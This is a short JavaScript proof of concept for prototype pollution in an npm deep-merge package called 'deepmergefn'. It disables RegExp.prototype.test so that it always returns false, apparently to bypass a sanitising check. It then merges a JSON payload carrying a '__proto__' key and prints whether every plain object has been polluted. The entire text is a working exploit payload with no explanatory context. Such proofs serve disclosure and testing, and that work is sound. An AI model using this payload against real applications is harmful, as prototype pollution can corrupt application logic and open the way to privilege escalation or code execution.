RegExp.prototype.test = () => false;
const deepMerge = require('deepmergefn');
console.log({}.polluted);
EVIL_DATA = JSON.parse('{"__proto__":{"polluted":"yes"}}');
deepMerge({}, EVIL_DATA);
console.log({}.polluted);